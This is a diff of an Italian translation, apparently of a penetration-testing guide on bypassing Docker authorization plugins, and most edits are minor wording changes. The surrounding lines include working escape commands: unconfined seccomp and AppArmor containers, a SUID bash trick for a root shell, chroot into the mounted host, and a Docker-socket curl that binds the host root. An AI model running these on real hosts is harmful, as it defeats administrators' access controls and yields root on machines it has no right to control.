@@ -10,11 +10,11 @@ I plugin di autorizzazione Docker sono **plugin esterni** che puoi utilizzare pe
 
 Quando viene effettuata una **richiesta HTTP** al **demone** Docker tramite la CLI o tramite l'API Engine, il **sottosistema di autenticazione** **trasmette** la richiesta ai **plugin di autenticazione** installati. La richiesta contiene l'utente (chiamante) e il contesto del comando. Il **plugin** è responsabile della decisione di **consentire** o **negare** la richiesta.
 
-I diagrammi di sequenza qui sotto mostrano un flusso di autorizzazione di consentire e negare:
+I diagrammi di sequenza qui sotto mostrano un flusso di autorizzazione di consenso e di negazione:
 
-![Flusso di autorizzazione consentito](https://docs.docker.com/engine/extend/images/authz_allow.png)
+![Flusso di autorizzazione consentita](https://docs.docker.com/engine/extend/images/authz_allow.png)
 
-![Flusso di autorizzazione negato](https://docs.docker.com/engine/extend/images/authz_deny.png)
+![Flusso di autorizzazione negata](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
 Ogni richiesta inviata al plugin **include l'utente autenticato, le intestazioni HTTP e il corpo della richiesta/risposta**. Solo il **nome utente** e il **metodo di autenticazione** utilizzato vengono passati al plugin. È importante notare che **nessuna** credenziale o token dell'utente vengono passati. Infine, **non tutti i corpi di richiesta/risposta vengono inviati** al plugin di autorizzazione. Solo quelli in cui il `Content-Type` è `text/*` o `application/json` vengono inviati.
 
@@ -36,7 +36,7 @@ Questo è un esempio che permetterà ad Alice e Bob di creare nuovi contenitori:
 
 Nella pagina [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) puoi trovare la relazione tra l'URL richiesto e l'azione. Nella pagina [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puoi trovare la relazione tra il nome dell'azione e l'azione.
 
-## Tutorial Plugin Semplice
+## Tutorial sul Plugin Semplice
 
 Puoi trovare un **plugin facile da capire** con informazioni dettagliate su installazione e debug qui: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
@@ -56,15 +56,15 @@ Per eseguire questa enumerazione puoi **utilizzare lo strumento** [**https://git
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
-### Eseguire un contenitore e poi ottenere una sessione privilegiata
+### Eseguire un container e poi ottenere una sessione privilegiata
 
-In questo caso, l'amministratore di sistema **ha vietato agli utenti di montare volumi e di eseguire contenitori con il flag `--privileged`** o di dare ulteriori capacità al contenitore:
+In questo caso, l'amministratore di sistema **ha vietato agli utenti di montare volumi e di eseguire container con il flag `--privileged`** o di dare ulteriori capacità al container:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-Tuttavia, un utente può **creare una shell all'interno del container in esecuzione e darle i privilegi extra**:
+Tuttavia, un utente può **creare una shell all'interno del contenitore in esecuzione e darle i privilegi extra**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -90,7 +90,7 @@ host> /tmp/bash
 -p #This will give you a shell as root
 ```
 > [!NOTE]
-> Nota che potresti non essere in grado di montare la cartella `/tmp`, ma puoi montare una **differente cartella scrivibile**. Puoi trovare directory scrivibili usando: `find / -writable -type d 2>/dev/null`
+> Nota che potresti non essere in grado di montare la cartella `/tmp`, ma puoi montare una **cartella scrivibile diversa**. Puoi trovare directory scrivibili usando: `find / -writable -type d 2>/dev/null`
 >
 > **Nota che non tutte le directory in una macchina linux supportano il bit suid!** Per controllare quali directory supportano il bit suid esegui `mount | grep -v "nosuid"` Ad esempio, di solito `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` e `/var/lib/lxcfs` non supportano il bit suid.
 >
@@ -118,11 +118,11 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 > [!WARNING]
-> Nota come in questo esempio stiamo usando il **`Binds`** param come una chiave di livello root nel JSON ma nell'API appare sotto la chiave **`HostConfig`**
+> Nota come in questo esempio stiamo usando il **`Binds`** param come chiave di livello root nel JSON ma nell'API appare sotto la chiave **`HostConfig`**
 
 ### Binds in HostConfig
 
-Segui le stesse istruzioni come con **Binds in root** eseguendo questa **richiesta** all'API Docker:
+Segui le stesse istruzioni come con **Binds in root** eseguendo questa **request** all'API Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
